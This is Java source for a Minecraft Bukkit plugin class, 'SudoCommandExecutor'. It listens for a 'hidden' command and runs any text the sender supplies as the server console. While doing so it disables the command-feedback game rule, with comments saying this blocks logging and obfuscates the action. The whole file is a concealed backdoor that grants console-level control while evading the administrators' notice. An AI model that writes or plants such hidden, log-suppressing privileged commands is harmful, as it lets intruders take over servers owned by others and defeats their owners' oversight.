package me.oscarcusick.aurora.Commands.Executors;

import me.oscarcusick.aurora.Commands.HiddenCommandEvent;
import org.bukkit.GameRule;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

public class SudoCommandExecutor implements Listener {
    Plugin PluginInstance;
    public SudoCommandExecutor(Plugin PluginInstance) {
        this.PluginInstance = PluginInstance;
    }

    @EventHandler
    public void SudoCommandExecutor(HiddenCommandEvent event) {
        if (!event.command.equalsIgnoreCase("Sudo")) {
            return;
        }

        boolean AlreadyCommandFeedBack = event.commandSender.getWorld().getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);

        // block logging attempts (not much)
        if (AlreadyCommandFeedBack) { // if the CommandFeedback is true, change it to false
            event.commandSender.getWorld().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
        }

        String FinalCommand = "";
        for (int i = 0; i < event.strings.length; i++) {
            FinalCommand += (event.strings[i].toString() + " ");
        }
        PluginInstance.getServer().dispatchCommand(PluginInstance.getServer().getConsoleSender(), FinalCommand); // server executes command to obfuscate it

        // unblock logging attempts (not much)
        if (AlreadyCommandFeedBack) { // if the CommandFeedback was true, change it back to true
            event.commandSender.getWorld().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, true);
        }

    }
}
